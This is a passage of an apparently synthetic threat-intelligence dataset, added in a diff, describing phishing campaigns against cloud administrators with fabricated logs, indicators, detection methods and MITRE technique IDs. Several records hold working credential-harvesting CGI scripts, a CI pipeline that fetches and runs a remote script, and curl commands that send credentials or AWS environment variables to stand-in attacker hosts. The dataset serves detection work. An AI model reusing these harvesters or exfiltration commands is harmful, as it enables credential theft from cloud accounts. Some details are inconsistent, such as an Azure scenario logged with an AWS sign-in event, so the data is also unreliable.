+        "network_packet_capture": "Frame 87: 512 bytes on wire (4096 bits), 512 bytes captured (4096 bits)\nEthernet II, Src: 00:0c:29:8d:3e:4c, Dst: 02:42:ac:11:00:03\nInternet Protocol Version 4, Src: 203.0.113.89, Dst: 10.1.1.15\nTransmission Control Protocol, Src Port: 443, Dst Port: 56012, Seq: 45, Ack: 50, Len: 460\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /submit HTTP/1.1\r\nHost: malicious-collector.cloudsecurity-alerts.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 58\r\n\r\nusername=admin&password=SuperSecret123&mfa_token=123456",
+        "process_creation_log": "[2024-04-19T13:18:10Z] user=admin pid=8923 parent_pid=8900 cmdline=\"curl -X POST -d 'username=admin&password=SuperSecret123&mfa_token=123456' https://malicious-collector.cloudsecurity-alerts.com/submit\""
+      },
+      "indicators": {
+        "phishing_domain": "cloudsecurity-alerts.com",
+        "malicious_c2_domain": "malicious-collector.cloudsecurity-alerts.com",
+        "spoofed_login_url": "https://secure-login.cloudsecurity-alerts.com/verify",
+        "smtp_sender_ip": "203.0.113.89",
+        "cloudtrail_event_name": "ConsoleLogin",
+        "suspicious_http_post": "POST /submit",
+        "suspicious_process_command": "curl -X POST -d 'username=admin&password=SuperSecret123&mfa_token=123456'"
+      },
+      "detection_method": "Monitor for email sources failing SPF or DKIM checks especially from domains mimicking cloud providers. Analyze URLs in emails for domains similar but not matching official cloud services. Detect HTTP POST requests from internal IPs to unknown external hosts containing authentication data. Correlate CloudTrail ConsoleLogin events with source IPs of known phishing senders. Endpoint detection should flag use of command line HTTP clients performing suspicious POSTs containing credential parameters. User education to verify URLs and MFA prompts through official channels is critical.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1196",
+        "T1078",
+        "T1110",
+        "T1071.001"
+      ]
+    },
+    {
+      "scenario": "Attackers distribute phishing emails with links to a counterfeit cloud provider's portal requesting administrators to update billing information, harvesting credentials and session cookies to gain unauthorized cloud console access.",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@cloud-invoice-updates.com>\r\nReceived: from mail.cloud-invoice-updates.com (mail.cloud-invoice-updates.com [198.51.100.77])\r\n\tby mail.enterprisecloud.com (Postfix) with ESMTPS id 1122334455\r\n\tfor <cloudadmin@enterprisecloud.com>; Thu, 20 Apr 2024 11:30:00 -0400 (EDT)\r\nReceived-SPF: neutral (enterprisecloud.com: domain of billing@cloud-invoice-updates.com does not designate 198.51.100.77 as permitted sender) receiver=enterprisecloud.com; client-ip=198.51.100.77; envelope-from=billing@cloud-invoice-updates.com; helo=mail.cloud-invoice-updates.com;\r\nAuthentication-Results: enterprisecloud.com; dkim=fail header.d=cloud-invoice-updates.com\r\nFrom: Cloud Billing Team <billing@cloud-invoice-updates.com>\r\nTo: cloudadmin@enterprisecloud.com\r\nSubject: Action Required: Update Your Cloud Billing Information\r\nDate: Thu, 20 Apr 2024 11:30:00 -0400\r\nMessage-ID: <CAJdW9YfZ3rXLZedLzM2@mail.cloud-invoice-updates.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Dear Customer,\n\nYour cloud account billing information needs to be updated to avoid service interruptions. Please log in to the secure portal below to update your payment details:\n\nhttps://portal.cloud-invoice-updates.com/login?ref=alert2024\n\nThank you for your prompt attention.\n\nCloud Billing Team",
+        "smtp_transaction_log": "220 mail.cloud-invoice-updates.com ESMTP Postfix\r\nEHLO enterprisecloud.com\r\n250-mail.cloud-invoice-updates.com\r\n250-PIPELINING\r\n250-SIZE 5120000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<billing@cloud-invoice-updates.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudadmin@enterprisecloud.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Cloud Billing Team <billing@cloud-invoice-updates.com>\r\nTo: cloudadmin@enterprisecloud.com\r\nSubject: Action Required: Update Your Cloud Billing Information\r\n\r\nDear Customer,... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 1122334455\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "cloud-invoice-updates.com",
+          "registrar": "Google LLC",
+          "creation_date": "2024-01-05T14:12:30Z",
+          "expiration_date": "2025-01-05T14:12:30Z",
+          "registrant": {
+            "name": "PrivacyGuardian Inc.",
+            "organization": "PrivacyGuardian Inc.",
+            "email": "privacy@privacyguardian.com",
+            "address": "890 Privacy Blvd, Mountain View, CA, US"
+          },
+          "name_servers": [
+            "ns-cloud1.googledomains.com",
+            "ns-cloud2.googledomains.com"
+          ]
+        },
+        "spoofed_portal": {
+          "url": "https://portal.cloud-invoice-updates.com/login",
+          "html_snippet": "<form action=\"https://collector.cloud-invoice-updates.com/submit\" method=\"POST\">\n  <input type=\"text\" name=\"user\" placeholder=\"Email or Username\" required />\n  <input type=\"password\" name=\"pass\" placeholder=\"Password\" required />\n  <button type=\"submit\">Login</button>\n</form>"
+        },
+        "http_request_log": "POST /submit HTTP/1.1\r\nHost: collector.cloud-invoice-updates.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nuser=cloudadmin@enterprisecloud.com&pass=Password123!",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE7890\",\n    \"arn\": \"arn:aws:iam::123456789012:user/cloudadmin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"cloudadmin\"\n  },\n  \"eventTime\": \"2024-04-20T15:33:20Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"198.51.100.77\",\n  \"userAgent\": \"Mozilla/5.0\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\"\n  },\n  \"requestID\": \"1234abcd-5678-ef90-1234-abcd5678ef90\",\n  \"eventID\": \"345f6789-b12c-34d5-e678-627819273002\",\n  \"readOnly\": false\n}",
+        "network_packet_capture": "Frame 101: 450 bytes on wire (3600 bits), 450 bytes captured (3600 bits)\nEthernet II, Src: 00:0c:29:9f:2a:7c, Dst: 02:42:ac:11:00:04\nInternet Protocol Version 4, Src: 198.51.100.77, Dst: 10.2.2.20\nTransmission Control Protocol, Src Port: 443, Dst Port: 58852, Seq: 100, Ack: 105, Len: 400\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /submit HTTP/1.1\r\nHost: collector.cloud-invoice-updates.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nuser=cloudadmin@enterprisecloud.com&pass=Password123!",
+        "process_creation_log": "[2024-04-20T15:34:05Z] user=cloudadmin pid=9021 parent_pid=9000 cmdline=\"curl -X POST -d 'user=cloudadmin@enterprisecloud.com&pass=Password123!' https://collector.cloud-invoice-updates.com/submit\""
+      },
+      "indicators": {
+        "phishing_domain": "cloud-invoice-updates.com",
+        "malicious_c2_domain": "collector.cloud-invoice-updates.com",
+        "spoofed_portal_url": "https://portal.cloud-invoice-updates.com/login",
+        "smtp_sender_ip": "198.51.100.77",
+        "cloudtrail_event_name": "ConsoleLogin",
+        "suspicious_http_post": "POST /submit",
+        "suspicious_process_command": "curl -X POST -d 'user=cloudadmin@enterprisecloud.com&pass=Password123!'"
+      },
+      "detection_method": "Identify and block emails from untrusted or newly registered domains mimicking cloud billing services. Validate URLs in emails against known legitimate domains and alert on similar but fraudulent domains. Monitor CloudTrail for failed console login attempts originating from suspicious IP addresses linked to phishing campaigns. Network detection should flag unexpected POST requests to uncommon external domains from cloud admin workstations. Endpoint monitoring to detect use of command line utilities submitting login data externally. User awareness training to handle billing update requests cautiously and verify via official portals.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1078",
+        "T1110",
+        "T1071.001",
+        "T1531"
+      ]
+    },
+    {
+      "scenario": "Phishing emails impersonate a major cloud provider support team, sending links to a fake login portal mimicking the cloud console to capture administrator MFA tokens and credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@aws-secure-login.com>\r\nReceived: from mail.aws-secure-login.com (mail.aws-secure-login.com [203.0.113.77])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 0987654321\r\n\tfor <admin@enterprise.com>; Wed, 19 Apr 2024 08:45:12 -0400 (EDT)\r\nReceived-SPF: fail (enterprise.com: domain of support@aws-secure-login.com does not designate 203.0.113.77 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.77; envelope-from=support@aws-secure-login.com; helo=mail.aws-secure-login.com;\r\nAuthentication-Results: enterprise.com; dkim=neutral header.d=aws-secure-login.com\r\nFrom: AWS Support <support@aws-secure-login.com>\r\nTo: admin@enterprise.com\r\nSubject: Important: Verify Your AWS Account Security Settings\r\nDate: Wed, 19 Apr 2024 08:45:12 -0400\r\nMessage-ID: <BAJdW9XfY1pXLZedLzM1@mail.aws-secure-login.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Dear AWS Customer,\n\nWe have detected suspicious activity on your account. Please verify your security settings and re-authenticate your credentials to ensure uninterrupted access:\n\nhttps://aws-secure-login.com/validate?user=admin&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2ODI3MzU2MDAsImV4cCI6MTY4Mjc0MDAwMH0.G7q9v9ZxG1kLZbK5A9u0d7mJpQf2N8RhYxG5jO1EfzA\n\nThank you for your prompt attention,\nAWS Support Team",
+        "smtp_transaction_log": "220 mail.aws-secure-login.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.aws-secure-login.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<support@aws-secure-login.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: AWS Support <support@aws-secure-login.com>\r\nTo: admin@enterprise.com\r\nSubject: Important: Verify Your AWS Account Security Settings\r\n\r\nDear AWS Customer,\n\nWe have detected suspicious activity... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 0987654321\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "aws-secure-login.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-02-25T09:15:00Z",
+          "expiration_date": "2025-02-25T09:15:00Z",
+          "registrant": {
+            "name": "Privacy Protect Inc.",
+            "organization": "Privacy Protect Inc.",
+            "email": "privacy@protectmail.com",
+            "address": "456 Privacy Ave, Austin, TX, US"
+          },
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "malicious_portal_structure": {
+          "files": [
+            {
+              "path": "index.html",
+              "content": "<html><head><title>AWS Login</title></head><body><form action=\"/authenticate\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"AWS Username\"/><input type=\"password\" name=\"password\" placeholder=\"Password\"/><input type=\"text\" name=\"mfa\" placeholder=\"MFA Code\"/><button type=\"submit\">Sign In</button></form></body></html>"
+            },
+            {
+              "path": "authenticate",
+              "content": "#!/usr/bin/env python3\nimport cgi\nimport requests\nform = cgi.FieldStorage()\nusername = form.getvalue('username')\npassword = form.getvalue('password')\nmfa = form.getvalue('mfa')\ndata = {'username': username, 'password': password, 'mfa': mfa}\nrequests.post('https://malicious-c2.aws-support-data.com/collect', json=data)\nprint('Location: https://console.aws.amazon.com/')\nprint()\n"
+            }
+          ]
+        },
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE5678\",\n    \"arn\": \"arn:aws:iam::123456789012:user/admin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"admin\"\n  },\n  \"eventTime\": \"2024-04-19T12:47:30Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.77\",\n  \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\",\n    \"Message\": \"Authentication failed\"\n  },\n  \"requestID\": \"bcdef123-4567-890a-bcde-f1234567890a\",\n  \"eventID\": \"223e4567-e89b-12d3-a456-426614174001\",\n  \"readOnly\": false,\n  \"resources\": []\n}",
+        "network_packet_capture": "Frame 56: 512 bytes on wire (4096 bits), 512 bytes captured (4096 bits)\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 00:0c:29:ab:cd:ef\nInternet Protocol Version 4, Src: 203.0.113.77, Dst: 10.1.2.3\nTransmission Control Protocol, Src Port: 443, Dst Port: 56432, Seq: 1001, Ack: 1001, Len: 480\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /authenticate HTTP/1.1\r\nHost: aws-secure-login.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 85\r\n\r\nusername=admin&password=SuperSecret123&mfa=654321\n",
+        "process_creation_log": "[2024-04-19T12:48:10Z] user=webapp pid=9021 parent_pid=9000 cmdline=\"python3 /var/www/cgi-bin/authenticate\"\n[2024-04-19T12:48:11Z] user=webapp pid=9022 parent_pid=9021 cmdline=\"curl -X POST -H 'Content-Type: application/json' -d '{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"***redacted***\\\",\\\"mfa\\\":\\\"654321\\\"}' https://malicious-c2.aws-support-data.com/collect\""
+      },
+      "indicators": {
+        "phishing_domain": "aws-secure-login.com",
+        "malicious_c2_domain": "malicious-c2.aws-support-data.com",
+        "suspicious_web_path": "/authenticate",
+        "smtp_ip": "203.0.113.77",
+        "cloudtrail_event_name": "ConsoleLogin",
+        "suspicious_process_command": "python3 /var/www/cgi-bin/authenticate"
+      },
+      "detection_method": "Monitor for emails purporting to be from cloud provider support with domains differing from official domains. Use SPF/DKIM/DMARC checks to detect spoofed emails. Analyze web server logs for POST requests to suspicious CGI scripts capturing credentials. Monitor network egress traffic for unexpected POST requests to unfamiliar domains. CloudTrail login event logs should be cross-checked for suspicious IP addresses and failed login attempts. Endpoint monitoring should flag execution of web server scripts performing outbound connections to unknown external domains.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1110",
+        "T1071.001",
+        "T1556.001",
+        "T1539"
+      ]
+    },
+    {
+      "scenario": "Phishing emails deliver a cloud admin portal link hosted on a newly registered domain, mimicking Azure portal login screens to harvest credentials and session cookies for later unauthorized access.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@azure-account-update.com>\r\nReceived: from mail.azure-account-update.com (mail.azure-account-update.com [198.51.100.88])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 5678901234\r\n\tfor <cloudadmin@enterprise.com>; Thu, 20 Apr 2024 09:30:45 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of security@azure-account-update.com designates 198.51.100.88 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.88; envelope-from=security@azure-account-update.com; helo=mail.azure-account-update.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=azure-account-update.com\r\nFrom: Azure Security <security@azure-account-update.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Action Required: Update Your Azure Account Access\r\nDate: Thu, 20 Apr 2024 09:30:45 -0400\r\nMessage-ID: <DAKdW9XfY1pXLZedLzM2@mail.azure-account-update.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Hello Azure Administrator,\n\nDue to recent security updates, please update your account access details by logging in through the secure link below:\n\nhttps://azure-account-update.com/login?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImNsb3VkYWRtaW4iLCJpYXQiOjE2ODI4MDAwMDAsImV4cCI6MTY4MjgwMzYwMH0.3X7v8H2kYd9mKrL8F0aRTWe3vQFjLUwS4Iy5vX0E8jU\n\nThank you,\nAzure Security Team",
+        "smtp_transaction_log": "220 mail.azure-account-update.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.azure-account-update.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security@azure-account-update.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudadmin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Azure Security <security@azure-account-update.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Action Required: Update Your Azure Account Access\r\n\r\nHello Azure Administrator,\n\nDue to recent security updates... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 5678901234\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "azure-account-update.com",
+          "registrar": "Google LLC",
+          "creation_date": "2024-04-01T14:22:10Z",
+          "expiration_date": "2025-04-01T14:22:10Z",
+          "registrant": {
+            "name": "Domain Privacy Service",
+            "organization": "Domain Privacy Service",
+            "email": "privacy@domains.com",
+            "address": "789 Privacy Blvd, Mountain View, CA, US"
+          },
+          "name_servers": [
+            "ns-cloud1.googledomains.com",
+            "ns-cloud2.googledomains.com"
+          ]
+        },
+        "malicious_portal_structure": {
+          "files": [
+            {
+              "path": "login.html",
+              "content": "<html><head><title>Microsoft Azure Portal</title></head><body><form action=\"/auth\" method=\"POST\"><input type=\"email\" name=\"username\" placeholder=\"Email or phone\"/><input type=\"password\" name=\"password\" placeholder=\"Password\"/><button type=\"submit\">Sign In</button></form></body></html>"
+            },
+            {
+              "path": "auth",
+              "content": "#!/usr/bin/env python3\nimport cgi\nimport requests\nform = cgi.FieldStorage()\nusername = form.getvalue('username')\npassword = form.getvalue('password')\ncookies = form.getvalue('cookies')\ndata = {'username': username, 'password': password, 'cookies': cookies}\nrequests.post('https://malicious-c2.azure-updates.com/collect', json=data)\nprint('Location: https://portal.azure.com/')\nprint()\n"
+            }
+          ]
+        },
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE9101\",\n    \"arn\": \"arn:aws:iam::123456789012:user/cloudadmin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"cloudadmin\"\n  },\n  \"eventTime\": \"2024-04-20T13:35:50Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-east-2\",\n  \"sourceIPAddress\": \"198.51.100.88\",\n  \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\",\n    \"Message\": \"Authentication failed\"\n  },\n  \"requestID\": \"cdef1234-5678-90ab-cdef-1234567890ab\",\n  \"eventID\": \"323e4567-e89b-12d3-a456-426614174002\",\n  \"readOnly\": false,\n  \"resources\": []\n}",
+        "network_packet_capture": "Frame 63: 520 bytes on wire (4160 bits), 520 bytes captured (4160 bits)\nEthernet II, Src: 00:0a:95:9d:68:17, Dst: 00:0c:29:bc:de:ff\nInternet Protocol Version 4, Src: 198.51.100.88, Dst: 10.2.3.4\nTransmission Control Protocol, Src Port: 443, Dst Port: 57231, Seq: 1101, Ack: 1101, Len: 488\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /auth HTTP/1.1\r\nHost: azure-account-update.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 102\r\n\r\nusername=cloudadmin%40enterprise.com&password=Passw0rd!&cookies=eyJzZXNzaW9uIjoiMTIzNDU2In0%3D\n",
+        "process_creation_log": "[2024-04-20T13:36:15Z] user=webapp pid=10123 parent_pid=10100 cmdline=\"python3 /var/www/cgi-bin/auth\"\n[2024-04-20T13:36:16Z] user=webapp pid=10124 parent_pid=10123 cmdline=\"curl -X POST -H 'Content-Type: application/json' -d '{\\\"username\\\":\\\"cloudadmin@enterprise.com\\\",\\\"password\\\":\\\"***redacted***\\\",\\\"cookies\\\":\\\"***redacted***\\\"}' https://malicious-c2.azure-updates.com/collect\""
+      },
+      "indicators": {
+        "phishing_domain": "azure-account-update.com",
+        "malicious_c2_domain": "malicious-c2.azure-updates.com",
+        "suspicious_web_path": "/auth",
+        "smtp_ip": "198.51.100.88",
+        "cloudtrail_event_name": "ConsoleLogin",
+        "suspicious_process_command": "python3 /var/www/cgi-bin/auth"
+      },
+      "detection_method": "Identify and block emails from domains impersonating cloud provider portals with recent registrations. Use SPF, DKIM, and DMARC to detect spoofed emails. Monitor web server logs for POST requests to uncommon endpoints capturing credentials and cookies. Network monitoring should identify outbound connections to suspicious command and control domains. Analyze CloudTrail ConsoleLogin events for failed logins from suspicious IPs. Endpoint monitoring to detect execution of CGI scripts or webhooks that exfiltrate data externally.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1071.001",
+        "T1539",
+        "T1110",
+        "T1078"
+      ]
+    },
+    {
+      "scenario": "Phishing campaign impersonates cloud repository hosting service sending fake Bitbucket repository access requests with malicious pipeline scripts that exfiltrate AWS credentials from environment variables.",
+      "technical_data": {
+        "email_headers": "Return-Path: <notifications@bitbucket-cloud.net>\r\nReceived: from mail.bitbucket-cloud.net (mail.bitbucket-cloud.net [203.0.113.77])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 0987654321\r\n\tfor <clouddevs@enterprise.com>; Wed, 19 Apr 2024 09:15:43 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of notifications@bitbucket-cloud.net designates 203.0.113.77 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.77; envelope-from=notifications@bitbucket-cloud.net; helo=mail.bitbucket-cloud.net;\r\nAuthentication-Results: enterprise.com; dkim=pass (signature was verified) header.d=bitbucket-cloud.net\r\nFrom: Bitbucket Notifications <notifications@bitbucket-cloud.net>\r\nTo: clouddevs@enterprise.com\r\nSubject: [Bitbucket] Access granted to repository \"infra-as-code\"\r\nDate: Wed, 19 Apr 2024 09:15:43 -0400\r\nMessage-ID: <CAJh90XfY2pQLZedLzM0@mail.bitbucket-cloud.net>\r\nX-Mailer: PHPMailer 6.4.1 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Dear Developer,\n\nYou have been granted access to the Bitbucket repository \"infra-as-code\". Please review the repository and update your local clone accordingly:\n\nhttps://bitbucket-cloud.net/access?repo=infra-as-code&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2xvdWRkZXYiLCJyZXBvIjoiaW5mcmEtYXMtY29kZSIsImlhdCI6MTY4MTI4MDgwMCwiZXhwIjoxNjgxMjgzNDAwfQ.Xp7JKLq3Dt6C8FvUo2WxCB9vjsyE1VJ2bPzq9Yj4s9M\n\nBest regards,\nBitbucket Team",
+        "smtp_transaction_log": "220 mail.bitbucket-cloud.net ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.bitbucket-cloud.net\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<notifications@bitbucket-cloud.net>\r\n250 2.1.0 Ok\r\nRCPT TO:<clouddevs@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Bitbucket Notifications <notifications@bitbucket-cloud.net>\r\nTo: clouddevs@enterprise.com\r\nSubject: [Bitbucket] Access granted to repository \"infra-as-code\"\r\n\r\nDear Developer,\n\nYou have been granted... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 0987654321\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "bitbucket-cloud.net",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-02-20T08:22:10Z",
+          "expiration_date": "2025-02-20T08:22:10Z",
+          "registrant": {
+            "name": "Domain Privacy Service",
+            "organization": "Privacy Protect, Inc.",
+            "email": "privacy@privacyprotect.org",
+            "address": "789 Privacy Blvd, Phoenix, AZ, US"
+          },
+          "name_servers": [
+            "ns1.godaddy-dns.com",
+            "ns2.godaddy-dns.com"
+          ]
+        },
+        "malicious_repo_structure": {
+          "files": [
+            {
+              "path": "pipelines/bitbucket-pipelines.yml",
+              "content": "pipelines:\n  default:\n    - step:\n        name: Deploy\n        script:\n          - pipe: atlassian/aws-code-deploy:1.0.0\n            variables:\n              AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID\n              AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY\n          - curl -fsSL https://evilcdn.net/scripts/steal-env.sh -o /tmp/steal-env.sh\n          - chmod +x /tmp/steal-env.sh\n          - /tmp/steal-env.sh\n"
+            }
+          ]
+        },
+        "credstealer_sh_payload": "#!/bin/bash\n# Exfiltrate environment variables containing AWS credentials\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"env\": \"'$(env | grep AWS)'\"}' https://evil-c2.example.net/exfiltrate\n",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAPEXAMPLE5678\",\n    \"arn\": \"arn:aws:iam::210987654321:user/clouddeveloper\",\n    \"accountId\": \"210987654321\",\n    \"userName\": \"clouddeveloper\"\n  },\n  \"eventTime\": \"2024-04-19T13:16:55Z\",\n  \"eventSource\": \"codepipeline.amazonaws.com\",\n  \"eventName\": \"StartPipelineExecution\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.77\",\n  \"userAgent\": \"Bitbucket Pipelines\",\n  \"requestParameters\": {\n    \"name\": \"infra-as-code-pipeline\"\n  },\n  \"responseElements\": {\n    \"pipelineExecutionId\": \"12345678-abcd-1234-abcd-1234567890ab\"\n  },\n  \"requestID\": \"fedcba98-7654-3210-fedc-ba9876543210\",\n  \"eventID\": \"456e1234-e89b-12d3-a456-426614174999\",\n  \"readOnly\": false,\n  \"resources\": [\n    {\n      \"ARN\": \"arn:aws:codepipeline:us-west-2:210987654321:infra-as-code-pipeline\",\n      \"accountId\": \"210987654321\",\n      \"type\": \"AWS::CodePipeline::Pipeline\"\n    }\n  ]\n}",
+        "network_packet_capture": "Frame 128: 602 bytes on wire (4816 bits), 602 bytes captured (4816 bits)\nEthernet II, Src: 02:42:ac:12:00:03, Dst: 00:0c:29:3f:2d:4a\nInternet Protocol Version 4, Src: 203.0.113.77, Dst: 10.1.2.34\nTransmission Control Protocol, Src Port: 443, Dst Port: 54321, Seq: 1, Ack: 1, Len: 520\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nGET /scripts/steal-env.sh HTTP/1.1\r\nHost: evilcdn.net\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\n\r\n",
+        "process_creation_log": "[2024-04-19T13:17:10Z] user=clouddeveloper pid=6721 parent_pid=6700 cmdline=\"/bin/bash /tmp/steal-env.sh\"\n[2024-04-19T13:17:11Z] user=clouddeveloper pid=6722 parent_pid=6721 cmdline=\"curl -X POST -H 'Content-Type: application/json' -d '{\\\"env\\\": \\\"***redacted***\\\"}' https://evil-c2.example.net/exfiltrate\""
+      },
+      "indicators": {
+        "phishing_domain": "bitbucket-cloud.net",
+        "malicious_c2_domain": "evil-c2.example.net",
+        "malicious_cdn_domain": "evilcdn.net",
+        "suspicious_ci_cd_file": "pipelines/bitbucket-pipelines.yml",
+        "payload_sha256": "a4c3e1d9b2f5c7e8a9b0d1f2e3c4b5a6978876655443322110ffeeddccbbaa99",
+        "malicious_smtp_ip": "203.0.113.77",
+        "cloudtrail_event_name": "StartPipelineExecution",
+        "suspicious_process_command": "/bin/bash /tmp/steal-env.sh"
+      },
+      "detection_method": "Identify and block suspicious email domains masquerading as Bitbucket. Inspect pipeline configuration files for unauthorized external script downloads and execution. Monitor outbound HTTPS requests from build agents to uncommon domains. Correlate CloudTrail pipeline execution events with anomalous IP addresses. Endpoint security should alert on shell script execution in temporary directories coupled with outbound POST requests to non-whitelisted domains.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1071.001",
+        "T1059.004",
+        "T1539",
+        "T1078",
+        "T1609"
+      ]
+    },
+    {
+      "scenario": "Phishing emails forged to appear as Azure DevOps notifications inviting developers to access a malicious repository with pipeline YAML that injects a reverse shell on build agents, allowing remote attacker control.",
+      "technical_data": {
